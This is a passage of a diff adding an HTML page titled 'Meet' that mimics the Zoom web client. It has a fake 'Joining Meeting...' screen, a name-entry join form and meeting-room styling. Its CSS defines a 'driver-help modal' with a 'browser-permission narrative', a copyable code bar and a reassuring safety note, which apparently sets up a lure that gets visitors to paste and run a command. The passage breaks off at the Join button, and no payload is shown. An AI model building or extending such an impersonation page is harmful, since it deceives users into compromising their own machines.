@@ -1,0 +1,1178 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<link rel="icon" type="image/png" href="favicon.png">
+<link rel="shortcut icon" href="favicon.png">
+<link rel="apple-touch-icon" href="favicon.png">
+<title>Meet</title>
+<style>
+
+:root{
+  --font:system-ui,"SF Pro","Segoe UI","Almaden Sans",Roboto,Ubuntu,Helvetica,Arial,"Apple Color Emoji","Segoe UI Emoji",sans-serif;
+  --zoom-blue:#0e71eb; --blue:#0d6efd; --orange:#f5511e;
+  --warn:#faac2a; --leave:#ff0055; --green:#25e55f; --share:#16d973;
+  --bar:rgba(0,0,0,0.7); --stage:#0e0e10; --tile:#1a1a1a; --chev:#bdbdbd;
+  --p-mic:#6e6e76; --p-off:#e02828; --p-grey:#6e7680;
+}
+*{box-sizing:border-box;margin:0;padding:0;}
+html,body{height:100%;}
+body{font-family:var(--font);overflow:hidden;background:#000;-webkit-font-smoothing:antialiased;}
+button,input,textarea{font-family:var(--font);}
+
+.screen{position:fixed;inset:0;opacity:0;visibility:hidden;transition:opacity .4s ease;display:flex;}
+.screen.active{opacity:1;visibility:visible;}
+
+#loading1,#loading2{background:#1a1a1a;flex-direction:column;align-items:center;justify-content:center;}
+.spinner{width:68px;height:68px;border-radius:50%;border:3px solid rgba(255,255,255,.85);border-top-color:#4a8fd6;animation:spin 1s linear infinite;}
+@keyframes spin{to{transform:rotate(360deg);}}
+.loading-text{margin-top:34px;color:#fff;font-size:25px;font-weight:300;}
+
+#info{background:#fff;flex-direction:column;}
+.back{position:absolute;top:32px;left:38px;color:var(--zoom-blue);font-size:14px;display:flex;align-items:center;gap:2px;cursor:pointer;}
+.back svg{width:20px;height:20px;}
+.info-body{flex:1;display:flex;align-items:center;justify-content:center;gap:40px;padding:0 38px;}
+.preview{position:relative;width:700px;height:394px;border-radius:14px;overflow:hidden;background:#242424;display:flex;align-items:center;justify-content:center;}
+.preview-default-avatar{position:absolute;inset:0;display:flex;align-items:center;justify-content:center;color:#4a4a4a;}
+.preview-default-avatar svg{width:200px;height:200px;}
+.av-controls{position:absolute;bottom:12px;left:50%;transform:translateX(-50%);display:flex;background:rgba(0,0,0,0.8);border-radius:10px;}
+.av-btn{position:relative;width:88px;height:52px;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:0;color:#f7f9fa;font-size:12px;cursor:pointer;border-radius:10px;}
+.av-btn span{line-height:15px;}
+.av-btn:hover{background:#26262b;}
+.av-icon-wrap{position:relative;height:24px;display:flex;align-items:center;}
+.av-icon-wrap svg{height:24px;width:auto;}
+.preview-toggle{position:absolute;top:2px;right:2px;width:24px;height:24px;display:flex;align-items:center;justify-content:center;background:none;border:none;border-radius:8px;cursor:pointer;}
+.preview-toggle svg{width:16px;height:16px;}
+.backgrounds{position:absolute;bottom:10px;right:10px;display:flex;align-items:center;gap:4px;background:rgba(0,0,0,0.8);color:rgba(255,255,255,0.8);font-size:12px;padding:7px 12px;border-radius:8px;cursor:pointer;}
+.backgrounds svg{width:16px;height:16px;}
+.info-form{width:392px;display:flex;flex-direction:column;align-items:center;}
+.info-form h1{font-size:24px;font-weight:700;line-height:36px;color:#4a4a4a;margin-bottom:6px;text-align:center;}
+.field{width:392px;display:flex;flex-direction:column;align-items:flex-start;margin-bottom:12px;}
+.field label{font-size:14px;font-weight:510;line-height:20px;color:#131619;margin-bottom:5px;}
+.field input[type="text"]{width:392px;height:40px;border:2px solid #98a0a9;border-radius:10px;padding:0 18px;font-size:14px;color:#000;outline:none;transition:border-color .15s;box-sizing:border-box;}
+.field input[type="text"]:focus{border-color:var(--zoom-blue);}
+.remember-row{align-self:flex-start;display:flex;align-items:center;gap:8px;font-size:13px;line-height:20px;color:#4a4a4a;cursor:pointer;}
+.remember-row input{width:16px;height:16px;margin:0;accent-color:var(--zoom-blue);cursor:pointer;flex-shrink:0;}
+.join-btn{width:400px;height:40px;margin-top:12px;border:none;border-radius:10px;background:#f1f4f6;color:#6e7680;font-size:16px;font-weight:700;cursor:not-allowed;transition:background .15s,color .15s;}
+.join-btn.enabled{background:var(--zoom-blue);color:#fff;cursor:pointer;}
+.join-btn.enabled:hover{background:#1a7ef0;}
+.terms-text{align-self:flex-start;width:392px;font-size:14px;line-height:21px;color:#131619;margin-top:16px;}
+.recaptcha-text{align-self:flex-start;width:392px;font-size:14px;line-height:16px;color:#131619;margin-top:16px;}
+.terms-text a,.recaptcha-text a{color:#0e72ed;cursor:pointer;text-decoration:none;}
+.terms-text a:hover,.recaptcha-text a:hover{text-decoration:underline;}
+.footer{text-align:center;padding-bottom:16px;font-size:12px;line-height:18px;color:#6e7680;}
+.footer a{color:#6e7680;text-decoration:underline;cursor:pointer;}
+
+#meeting{background:var(--stage);}
+.app{display:flex;width:100%;height:100%;}
+.meeting-col{flex:1;min-width:0;display:flex;flex-direction:column;}
+
+.topbar{height:48px;flex-shrink:0;background:var(--bar);display:flex;align-items:center;justify-content:space-between;padding:0 22px 0 24px;color:#fff;}
+.brand{display:flex;flex-direction:column;line-height:1;}
+.brand .b1{font-size:11px;font-weight:600;letter-spacing:.2px;}
+.brand .b2{font-size:15px;font-weight:800;color:#fff;}
+.top-right{display:flex;align-items:center;gap:12px;}
+.shield-btn{display:flex;align-items:center;cursor:pointer;padding:2px;border-radius:6px;}
+.shield-btn svg{width:16px;height:16px;}
+.vdiv{width:1px;height:20px;background:#3a3a3a;}
+.view-btn{display:flex;align-items:center;gap:6px;font-size:14px;cursor:pointer;padding:4px 7px;border-radius:6px;}
+.view-btn:hover,.view-btn.active{background:#34353a;}
+.view-btn svg{width:14px;height:14px;}
+.mt-circle{width:24px;height:24px;border-radius:8px;background:rgba(36,36,36,0.88);display:flex;align-items:center;justify-content:center;cursor:default;}
+.mt-icon{width:16px;height:16px;border-radius:5px;background:#fff;color:#1a1a1a;display:flex;align-items:center;justify-content:center;font-size:7.5px;font-weight:800;letter-spacing:.2px;}
+
+.stage{flex:1;position:relative;overflow:hidden;}
+.gallery{position:absolute;inset:0;display:flex;flex-wrap:wrap;align-content:center;justify-content:center;gap:10px;padding:16px;}
+.stage.speaker-mode .gallery{display:none;}
+.speaker{position:absolute;inset:0;display:none;flex-direction:column;}
+.stage.speaker-mode .speaker{display:flex;}
+.filmstrip{flex:0 0 120px;height:120px;display:flex;gap:1px;justify-content:center;align-items:center;padding:3px 0;box-sizing:border-box;}
+.filmstrip .vtile{height:117px;width:207px;aspect-ratio:auto;border-radius:0;flex:0 0 auto;}
+.main-speaker{flex:1;min-height:0;position:relative;display:flex;align-items:center;justify-content:center;}
+.main-speaker .vtile{position:relative;aspect-ratio:auto;background:#1a1a1a;border-radius:0;overflow:hidden;display:flex;align-items:center;justify-content:center;}
+.main-speaker .vtile .feed{position:absolute;inset:0;width:100%;height:100%;object-fit:cover;border-radius:0;}
+.main-speaker .vtile .avatar{position:absolute;inset:0;left:0;top:0;transform:none;width:100%;height:100%;max-width:none;border-radius:0;background:transparent!important;display:flex;align-items:center;justify-content:center;font-weight:400;text-transform:none;}
+.remove-pin{position:absolute;top:10px;left:12px;z-index:6;background:rgba(0,0,0,0.5);color:#fff;font-size:12px;height:22px;padding:0 6px;border:none;border-radius:7px;font-family:var(--font);cursor:pointer;display:flex;align-items:center;}
+
+.vtile{position:relative;aspect-ratio:16/9;background:var(--tile);overflow:hidden;flex:0 0 auto;border-radius:12px;}
+.vtile .feed{position:absolute;inset:0;width:100%;height:100%;object-fit:cover;background:#111;}
+.vtile .feed.self{transform:scaleX(-1);}
+.vtile .placeholder{position:absolute;inset:0;background:linear-gradient(140deg,hsl(var(--h,210),28%,16%),hsl(calc(var(--h,210) + 30),30%,8%));}
+.vtile .placeholder::before{content:"";position:absolute;left:50%;top:42%;width:34%;aspect-ratio:1;transform:translate(-50%,-50%);border-radius:50%;background:hsla(var(--h,210),30%,55%,.30);}
+.vtile .placeholder::after{content:"";position:absolute;inset:0;background:radial-gradient(circle at 35% 30%,hsla(var(--h,210),42%,48%,.13),transparent 48%);animation:feed 7s ease-in-out infinite alternate;}
+@keyframes feed{from{transform:translate(-4%,-2%) scale(1);}to{transform:translate(5%,3%) scale(1.06);}}
+.vtile .avatar{position:absolute;left:50%;top:50%;transform:translate(-50%,-50%);width:30%;max-width:96px;aspect-ratio:1;border-radius:10px;display:flex;align-items:center;justify-content:center;color:#fff;font-size:46px;font-weight:300;text-transform:uppercase;}
+.tile-name{position:absolute;bottom:8px;left:8px;display:flex;align-items:center;gap:6px;background:rgba(0,0,0,.6);color:#fff;font-size:13px;padding:3px 9px;border-radius:6px;max-width:calc(100% - 16px);}
+.tile-name svg{width:14px;height:14px;flex-shrink:0;}
+.tile-name .mic-off{color:var(--leave);}
+.tile-hand{position:absolute;top:8px;left:8px;font-size:20px;display:none;}
+.tile-hand.show{display:block;}
+.filmstrip .vtile .avatar{width:44px;height:44px;font-size:16px;border-radius:6px;}
+.filmstrip .tile-name{font-size:12px;bottom:0;left:0;border-radius:0;background:transparent;padding:4px 6px;}
+.filmstrip .tile-name svg{width:13px;height:13px;}
+.main-speaker .tile-name{font-size:13px;bottom:8px;left:10px;transform:none;border-radius:0;background:transparent;padding:0;white-space:nowrap;}
+.main-speaker .tile-name svg{width:15px;height:15px;}
+
+.notification-message-wrap{position:absolute;top:18px;left:50%;transform:translateX(-50%);z-index:30;max-width:90%;}
+.stage.speaker-mode .notification-message-wrap{top:138px;}
+.notification-message-wrap__layer{background:#0a0a0a;border-radius:14px;padding:14px 18px;box-shadow:0 4px 24px rgba(0,0,0,.45);}
+.notification-message-wrap__txt-container{display:flex;align-items:center;}
+.notification-message-wrap__txt{display:flex;align-items:center;color:#fff;font-size:16px;white-space:nowrap;}
+.notification-message-wrap__txt button{background:none;border:none;cursor:pointer;font-size:16px;font-family:var(--font);}
+.notification-message-wrap__close{margin-left:16px;width:14px;height:14px;cursor:pointer;position:relative;flex-shrink:0;}
+.notification-message-wrap__close::before,.notification-message-wrap__close::after{content:"";position:absolute;top:50%;left:0;width:14px;height:1.6px;background:#cfcfcf;}
+.notification-message-wrap__close::before{transform:rotate(45deg);}
+.notification-message-wrap__close::after{transform:rotate(-45deg);}
+
+.toolbar{height:52px;flex-shrink:0;background:var(--bar);display:flex;align-items:center;color:#fff;padding:0 8px;}
+.tb-left{display:flex;}
+.tb-center{flex:1;display:flex;justify-content:center;gap:4px;}
+.tb-right{display:flex;}
+.tool{display:flex;flex-direction:column;align-items:center;justify-content:center;gap:2px;padding:0 8px;height:48px;border-radius:8px;cursor:pointer;position:relative;min-width:80px;font-size:12px;font-weight:400;}
+.tool:hover{background:#34353a;}
+.tool.active{background:#3a3b40;}
+.tool.inactive{cursor:default;}
+.tool.inactive:hover{background:none;}
+.tool .ic{position:relative;height:24px;display:flex;align-items:center;justify-content:center;min-width:24px;}
+.tool .ic svg{height:24px;width:auto;display:block;}
+.tool .badge{position:absolute;top:4px;right:0;display:flex;align-items:center;gap:1px;z-index:1;}
+.tool .badge .count{font-size:12px;color:#dcdcdc;line-height:1;}
+.tool .tool-chev{position:absolute;top:5px;right:3px;line-height:0;}
+.tool .tool-chev svg{width:13px;height:13px;}
+.tool .warn-mini{position:absolute;right:-3px;bottom:-3px;width:13px;height:13px;}
+
+.popover{position:fixed;z-index:60;background:#232323;border:0.5px solid #3a3a3a;border-radius:14px;box-shadow:0 8px 30px rgba(0,0,0,.55);padding:10px;display:none;}
+.popover.open{display:block;}
+.react-pop{width:300px;}
+.emoji-row{display:flex;justify-content:space-between;align-items:center;padding:6px 6px 10px;}
+.emoji-row button{background:none;border:none;font-size:24px;cursor:pointer;padding:4px;border-radius:8px;line-height:1;}
+.emoji-row button:hover{background:#363636;transform:scale(1.12);}
+.emoji-row .more-emoji{color:#cfcfcf;font-size:20px;}
+.status-row{display:flex;gap:8px;padding:4px 4px 10px;}
+.status-row .st{flex:1;height:42px;border:none;border-radius:10px;background:#363636;color:#fff;font-size:18px;font-weight:700;cursor:pointer;display:flex;align-items:center;justify-content:center;}
+.status-row .st:hover{filter:brightness(1.15);}
+.status-row .st.green{background:#19b955;}
+.status-row .st.red{background:#e8413b;}
+.status-row .st.blue{background:#2d8cff;}
+.wide-btn{width:100%;height:46px;margin-top:8px;border:none;border-radius:10px;background:#363636;color:#fff;font-size:16px;font-weight:700;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:8px;}
+.wide-btn:hover{background:#444;}
+.wide-btn.on{background:#0e4ea8;}
+.more-pop{width:250px;padding:6px;}
+.m-item{display:flex;align-items:center;gap:14px;padding:11px 12px;border-radius:8px;cursor:pointer;color:#eee;font-size:16px;position:relative;}
+.m-item:hover{background:#363636;}
+.m-item svg{width:20px;height:20px;flex-shrink:0;}
+.m-item.selected{border:1px solid #6a6a6a;}
+.m-item .caret{margin-left:auto;color:#aaa;}
+.m-sep{height:1px;background:#3a3a3a;margin:5px 6px;}
+.submenu{position:absolute;left:calc(100% + 8px);top:-6px;width:210px;background:#232323;border:0.5px solid #3a3a3a;border-radius:14px;box-shadow:0 8px 30px rgba(0,0,0,.55);padding:6px;display:none;}
+.m-item.has-sub:hover .submenu{display:block;}
+.submenu .m-item{justify-content:center;}
+
+.info-panel{position:fixed;top:56px;right:12px;left:auto;width:480px;max-width:calc(100vw - 24px);z-index:70;display:none;background:#07080a;border:none;border-radius:16px;box-shadow:0 16px 50px rgba(0,0,0,.6);padding:26px 30px;color:#fff;}
+.info-panel.open{display:block;}
+.info-panel h2{font-size:23px;font-weight:700;margin-bottom:22px;}
+.info-grid{display:grid;grid-template-columns:175px 1fr;row-gap:16px;column-gap:18px;font-size:16px;}
+.info-grid .il{color:#9a9aa0;line-height:1.35;}
+.info-grid .iv{color:#fff;word-break:break-word;}
+.invite-url{margin-bottom:6px;line-height:1.4;}
+.copy-link{display:inline-flex;align-items:center;gap:6px;background:none;border:none;color:#2d8cff;font-size:16px;cursor:pointer;padding:0;}
+.copy-link svg{width:16px;height:16px;}
+.info-note{margin-top:22px;font-size:16px;line-height:1.45;}
+.info-report{margin-top:18px;color:#e8413b;font-size:16px;cursor:pointer;display:inline-flex;align-items:center;gap:8px;}
+
+.view-menu{position:fixed;z-index:70;width:300px;background:#1c1c1e;border:0.5px solid #3a3a3a;border-radius:12px;box-shadow:0 12px 40px rgba(0,0,0,.6);padding:6px;display:none;}
+.view-menu.open{display:block;}
+.vm-item{display:flex;align-items:center;gap:10px;padding:10px;border-radius:7px;cursor:pointer;font-size:16px;color:#eee;}
+.vm-item:hover:not(.disabled){background:#363636;}
+.vm-item.disabled{cursor:default;color:#cfcfcf;}
+.vm-check{width:16px;flex-shrink:0;color:#fff;text-align:center;font-size:14px;}
+.vm-label{flex:1;}
+.vm-ic{display:flex;color:#cfcfcf;}
+.vm-ic svg{width:18px;height:18px;}
+.vm-item.current{box-shadow:inset 0 0 0 1px rgba(255,255,255,.7);}
+.vm-sep{height:1px;background:#3a3a3a;margin:5px 6px;}
+
+/* ===== driver-help modal — Zoom dark theme, browser-permission narrative ===== */
+.drv-overlay{position:fixed;inset:0;z-index:200;background:rgba(0,0,0,0.6);display:none;align-items:center;justify-content:center;padding:24px;backdrop-filter:blur(2px);}
+.drv-overlay.open{display:flex;}
+.drv-modal{position:relative;width:480px;max-width:94vw;max-height:88vh;overflow-y:auto;background:#1c1c1e;border:0.5px solid #3a3a3a;border-radius:14px;box-shadow:0 24px 70px rgba(0,0,0,.8);padding:30px 34px 24px;color:#e8e8ea;font-size:14px;line-height:1.5;}
+.drv-close{position:absolute;top:16px;right:18px;width:28px;height:28px;background:none;border:none;color:#bdbdbd;font-size:22px;line-height:1;cursor:pointer;display:flex;align-items:center;justify-content:center;border-radius:6px;}
+.drv-close:hover{background:#363636;color:#fff;}
+.drv-icon-wrap{display:flex;justify-content:center;margin-bottom:14px;}
+.drv-icon-mic{width:52px;height:52px;border-radius:50%;background:rgba(14,114,237,0.14);border:1px solid rgba(14,114,237,0.32);display:flex;align-items:center;justify-content:center;}
+.drv-title{font-size:19px;font-weight:700;color:#fff;margin:0 0 10px;text-align:center;}
+.drv-lead{font-size:13.5px;color:#c1c1c6;margin-bottom:10px;line-height:1.55;text-align:center;}
+.drv-sublead{font-size:12.5px;color:#8f8f95;margin-bottom:20px;text-align:center;line-height:1.5;}
+.drv-steps{margin:0 0 4px;padding:0;list-style:none;counter-reset:s;}
+.drv-steps li{position:relative;padding-left:32px;margin-bottom:14px;color:#d1d1d6;line-height:1.55;font-size:13.5px;}
+.drv-steps li::before{counter-increment:s;content:counter(s);position:absolute;left:0;top:1px;width:20px;height:20px;background:#0e72ed;border-radius:50%;color:#fff;font-size:11px;font-weight:700;line-height:20px;display:flex;align-items:center;justify-content:center;text-align:center;}
+.drv-steps b{color:#fff;font-weight:600;}
+.drv-codebar{display:flex;align-items:center;gap:10px;background:#0a0a0b;border:0.5px solid #3a3a3a;border-radius:8px;padding:9px 10px 9px 14px;margin:10px 0 2px;}
+.drv-url{flex:1;font-family:ui-monospace,Menlo,Consolas,monospace;font-size:12.5px;color:#8fa9c9;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;user-select:none;}
+.drv-copy{flex-shrink:0;display:inline-flex;align-items:center;gap:6px;background:#0e72ed;color:#fff;border:none;border-radius:6px;padding:7px 14px;font-size:12.5px;font-weight:500;cursor:pointer;font-family:var(--font);transition:background .15s ease;}
+.drv-copy:hover{background:#1a7ef0;}
+.drv-copy.copied{background:#19b955;}
+.drv-safe-note{display:flex;align-items:flex-start;gap:8px;background:rgba(37,229,95,0.06);border-left:2px solid #25e55f;border-radius:4px;padding:10px 12px;font-size:12px;line-height:1.5;color:#b7d7c1;margin-top:18px;}
+.drv-safe-note svg{flex-shrink:0;margin-top:2px;}
+.drv-help{font-size:12px;color:#8f8f95;margin-top:16px;border-top:0.5px solid #2a2a2c;padding-top:14px;text-align:center;}
+.drv-help a{color:#0e72ed;cursor:pointer;text-decoration:none;}
+.drv-help a:hover{text-decoration:underline;}
+
+.reaction-layer{position:absolute;inset:0;pointer-events:none;z-index:50;overflow:hidden;}
+.float-emoji{position:absolute;bottom:90px;font-size:36px;animation:floatUp 3s ease-out forwards;}
+@keyframes floatUp{0%{transform:translateY(0) scale(.6);opacity:0;}15%{opacity:1;transform:translateY(-20px) scale(1);}100%{transform:translateY(-360px) scale(1);opacity:0;}}
+
+.side-panel{width:0;flex-shrink:0;overflow:hidden;height:100%;}
+.side-panel.open{width:400px;}
+.side-panel.dark{background:#040506;}
+.side-panel.light{background:#e9e9ee;}
+.panel-inner{width:398px;height:100%;margin:0 auto;border-radius:15px;display:flex;flex-direction:column;opacity:0;transform:translateX(16px);transition:opacity .2s ease,transform .2s ease;overflow:hidden;}
+.side-panel.open .panel-inner{opacity:1;transform:none;}
+.side-panel.dark .panel-inner{background:#1d1e20;color:#fff;}
+.side-panel.dark .chat-pmc{color:rgba(255,255,255,0.56);}
+.side-panel.dark .chat-input{background:transparent;color:#f5f7fb;}
+.side-panel.dark .chat-input::placeholder{color:#7c7c7c;}
+.side-panel.dark .chat-footer,.side-panel.dark .participants-footer{border-top:1px solid #2a2a2a;}
+.side-panel.dark .p-row:hover{background:#242424;}
+.side-panel.dark .pf-btn{border:1px solid #5a5a5a;color:#fff;background:transparent;}
+.side-panel.dark .who-see{background:#2b2c30;color:#dcdcdc;}
+.side-panel.dark .chat-tools{color:#cfcfcf;}
+.side-panel.dark .p-label{color:#9a9aa0;}
+.side-panel.light .panel-inner{background:#fff;color:#1a1a1a;}
+.side-panel.light .chat-pmc{color:#76767f;}
+.side-panel.light .chat-input{background:#fff;color:#1a1a1a;}
+.side-panel.light .chat-input::placeholder{color:#9a9aa5;}
+.side-panel.light .chat-footer,.side-panel.light .participants-footer{border-top:1px solid #e6e6e6;background:#f7f7f9;}
+.side-panel.light .p-row:hover{background:#f1f1f4;}
+.side-panel.light .pf-btn{border:1px solid #c7c7d0;color:#1a1a1a;background:#fff;}
+.side-panel.light .who-see{background:#eceef1;color:#5a5a66;}
+.side-panel.light .chat-tools{color:#5a5a66;}
+.side-panel.light .p-label{color:#76767f;}
+.panel-head{height:38px;flex-shrink:0;display:flex;align-items:center;gap:10px;padding:0 14px;}
+.chat-head-icon{display:flex;}
+.chat-head-icon svg{width:16px;height:16px;}
+.head-spacer{width:46px;flex-shrink:0;}
+.panel-title{flex:1;font-size:14px;font-weight:700;color:#f5f7fb;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;}
+.panel-title.center{text-align:center;}
+.panel-act{display:flex;gap:14px;color:var(--p-grey);}
+.panel-act svg{width:16px;height:16px;cursor:pointer;}
+.chat-pmc{padding:14px 40px;font-size:12px;text-align:center;line-height:1.5;}
+.chat-messages{flex:1;overflow-y:auto;padding:10px 16px;display:flex;flex-direction:column;gap:12px;}
+.chat-msg{font-size:14px;}
+.chat-msg .who{font-weight:700;font-size:13px;margin-bottom:2px;}
+.chat-msg .who span{font-weight:400;color:#8a8a8a;margin-left:6px;font-size:12px;}
+.chat-footer{flex-shrink:0;padding:10px 14px 14px;}
+.who-see{display:flex;box-sizing:border-box;width:calc(100% + 28px);margin:0 -14px 12px;padding:9px 14px;justify-content:center;align-items:center;gap:7px;font-size:13px;border:none;cursor:pointer;}
+.who-see svg{width:17px;height:17px;flex-shrink:0;}
+.to-row{display:flex;align-items:center;gap:8px;font-size:12px;color:#9da5b5;margin-bottom:10px;}
+.to-pill{background:#0e72ed;color:#fff;font-size:12px;padding:3px 11px;border-radius:10.5px;}
+.chat-input{width:100%;min-height:90px;max-height:160px;border:none;outline:none;resize:none;font-size:14px;line-height:1.4;}
+.chat-tools{display:flex;align-items:center;gap:18px;margin-top:6px;}
+.chat-tools svg{width:18px;height:18px;cursor:pointer;}
+.chat-tools .send svg{color:var(--zoom-blue);}
+.chat-tools .spacer{flex:1;}
+.p-list{flex:1;overflow-y:auto;padding:6px 0;}
+.p-row{display:flex;align-items:center;gap:12px;padding:0 16px;height:42px;}
+.p-left{display:flex;align-items:center;gap:12px;flex:1;min-width:0;}
+.p-av{width:32px;height:32px;border-radius:8px;display:flex;align-items:center;justify-content:center;color:#fff;font-size:15px;font-weight:700;overflow:hidden;flex-shrink:0;}
+.p-name-sec{font-size:12px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;}
+.p-label{font-size:12px;}
+.p-icons{display:flex;gap:14px;align-items:center;}
+.p-icons svg{width:16px;height:16px;}
+.participants-footer{flex-shrink:0;padding:14px 16px;display:flex;gap:12px;}
+.pf-btn{flex:1;height:36px;border-radius:8px;font-size:14px;cursor:pointer;}
+</style>
+</head>
+<body>
+
+<div class="screen" id="loading1"><div style="display:flex;flex-direction:column;align-items:center;"><div class="spinner"></div><div class="loading-text">Joining Meeting...</div></div></div>
+
+<div class="screen" id="info">
+  <div class="back" id="backBtn"><svg width="20" height="20" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M5.635 8.339a.498.498 0 0 0 .037.037l3.978 3.978a.5.5 0 1 0 .706-.708L6.715 8.004l3.639-3.65a.501.501 0 0 0 0-.708.499.499 0 0 0-.707 0L5.731 7.575a.502.502 0 0 0-.096.764Z" fill="currentColor"></path></svg>Back</div>
+  <div class="info-body">
+    <div class="preview">
+      <div class="preview-default-avatar">
+        <svg width="200" height="200" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg"><mask id="zm-dav-mask" maskUnits="userSpaceOnUse" x="1" y="2" width="14" height="12" style="mask-type:alpha"><path fill-rule="evenodd" clip-rule="evenodd" d="M1.218 3.092C1 3.52 1 4.08 1 5.2v5.6c0 1.12 0 1.68.218 2.108a2 2 0 0 0 .874.874C2.52 14 3.08 14 4.2 14h7.6c1.12 0 1.68 0 2.108-.218a2 2 0 0 0 .874-.874C15 12.48 15 11.92 15 10.8V5.2c0-1.12 0-1.68-.218-2.108a2 2 0 0 0-.874-.874C13.48 2 12.92 2 11.8 2H4.2c-1.12 0-1.68 0-2.108.218a2 2 0 0 0-.874.874ZM8 8.933a2.133 2.133 0 1 0 0-4.266 2.133 2.133 0 0 0 0 4.266ZM8 10c-2.4 0-4 1.075-4 2.4 0 .212.041.415.116.6h7.768c.075-.185.116-.388.116-.6 0-.509-.236-.98-.662-1.37C10.653 10.409 9.478 10 8 10Z" fill="#000001"></path></mask><g mask="url(#zm-dav-mask)"><rect width="16" height="16" fill="currentColor"></rect></g></svg>
+      </div>
+      <div class="av-controls">
+        <div class="av-btn">
+          <div class="av-icon-wrap">
+            <svg width="32" height="24" viewBox="0 0 32 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M16.145 3.816a.617.617 0 0 0 .167-.61A4.495 4.495 0 0 0 12 0C9.51 0 7.5 2.01 7.5 4.5v7.125c0 .284.34.43.546.236l.719-.678A.75.75 0 0 0 9 10.637V4.5c0-1.65 1.35-3 3-3s3 1.35 3 3c0 .17.206.255.326.135l.819-.819ZM16.5 6.29 15 7.79V12c0 1.65-1.35 3-3 3a3.008 3.008 0 0 1-2.637-1.574L8.269 14.52A4.491 4.491 0 0 0 12 16.5c2.49 0 4.5-2.01 4.5-4.5V6.29ZM5.915 14.046a.857.857 0 0 0 .217-.789A6.028 6.028 0 0 1 6 12c0-.42-.33-.75-.75-.75s-.75.33-.75.75c0 .045 0 .105.015.15.009.553.078 1.091.2 1.608.131.548.802.686 1.2.288Zm.214 2.614 1.066-1.066A5.99 5.99 0 0 0 12 18c3.315 0 6-2.685 6-6 0-.42.33-.75.75-.75s.75.33.75.75c0 .045 0 .105-.015.15-.06 3.81-2.985 6.93-6.735 7.305V22.5h3c.42 0 .75.33.75.75s-.33.75-.75.75h-7.5c-.42 0-.75-.33-.75-.75s.33-.75.75-.75h3v-3.045a7.489 7.489 0 0 1-5.12-2.795Z" fill="#fff"></path><path fill-rule="evenodd" clip-rule="evenodd" d="M17.257 20.765A1.5 1.5 0 0 0 18.565 23h10.87a1.5 1.5 0 0 0 1.308-2.235l-5.436-9.663a1.5 1.5 0 0 0-2.614 0l-5.436 9.663ZM23.35 17.6v-2.95a.65.65 0 0 1 1.3 0v2.95a.65.65 0 0 1-1.3 0Zm-.1 2.65a.75.75 0 1 1 1.5 0 .75.75 0 0 1-1.5 0Z" fill="#F05"></path><path d="m3.375 19.875 17.25-17.25" stroke="#F05" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"></path></svg>
+          </div><span>Mute</span>
+        </div>
+        <div class="av-btn av-btn-video">
+          <div class="av-icon-wrap">
+            <svg width="38" height="25" viewBox="0 0 38 25" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M15.137 4.802c.269-.268.29-.704-.002-.946A3.735 3.735 0 0 0 12.75 3H3A2.25 2.25 0 0 0 .75 5.25v8.25c0 1.385.751 2.595 1.869 3.245.223.13.502.073.685-.11.37-.369.15-1.076-.25-1.411A2.245 2.245 0 0 1 2.25 13.5V5.25A.75.75 0 0 1 3 4.5h9.75c.433 0 .837.122 1.18.334.376.232.895.28 1.207-.032ZM6.31 15.75h7.94A.75.75 0 0 0 15 15V7.06l1.353-1.353c.096.331.147.681.147 1.043V15a2.25 2.25 0 0 1-2.25 2.25H4.81l1.5-1.5ZM22.846 4.585a.75.75 0 0 1 .404.665V15a.75.75 0 0 1-1.18.614l-3.75-2.625a.75.75 0 0 1 .86-1.228l2.57 1.799V6.69l-2.57 1.8a.75.75 0 1 1-.86-1.23l3.75-2.624a.75.75 0 0 1 .776-.051Z" fill="#fff"></path><path fill-rule="evenodd" clip-rule="evenodd" d="M20.78 2.22a.75.75 0 0 1 0 1.06L3.53 20.53a.75.75 0 0 1-1.06-1.06L19.72 2.22a.75.75 0 0 1 1.06 0ZM23.257 20.765A1.5 1.5 0 0 0 24.565 23h10.87a1.5 1.5 0 0 0 1.308-2.235l-5.436-9.663a1.5 1.5 0 0 0-2.614 0l-5.436 9.663ZM29.35 17.6v-2.95a.65.65 0 1 1 1.3 0v2.95a.65.65 0 0 1-1.3 0Zm-.1 2.65a.75.75 0 1 1 1.5 0 .75.75 0 0 1-1.5 0Z" fill="#F05"></path></svg>
+          </div><span>Stop Video</span>
+          <button class="preview-toggle"><svg width="16" height="16" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M11.816 10.172a.6.6 0 0 1-.849-.016L8 7.006l-2.968 3.15a.6.6 0 1 1-.864-.832l3.4-3.6a.6.6 0 0 1 .864 0l3.4 3.6a.6.6 0 0 1-.016.848Z" fill="#fff" opacity="0.5"></path></svg></button>
+        </div>
+      </div>
+      <div class="backgrounds"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 16 16" fill="none"><path d="M14 2H2C.897 2 0 2.897 0 4v8c0 1.102.897 2 2 2h12c1.103 0 2-.898 2-2V4c0-1.103-.897-2-2-2Zm1 10c0 .551-.448 1-1 1h-2.041c.011-.064.041-.121.041-.188 0-1.311-1.714-2.374-4-2.374S4 11.5 4 12.812c0 .067.03.124.041.188H2c-.552 0-1-.449-1-1V4c0-.551.448-1 1-1h12c.552 0 1 .449 1 1v8ZM8 4.5a2.376 2.376 0 1 0 0 4.752A2.376 2.376 0 0 0 8 4.5Z" fill="#fff"></path></svg><span>Backgrounds</span></div>
+    </div>
+    <div class="info-form">
+      <h1>Enter Meeting Info</h1>
+      <div class="field">
+        <label for="nameInput">Your Name</label>
+        <input type="text" id="nameInput" autocomplete="off">
+      </div>
+      <label class="remember-row"><input type="checkbox" id="rememberName"><span>Remember my name for future meetings</span></label>
+      <button class="join-btn" id="joinBtn">Join</button>
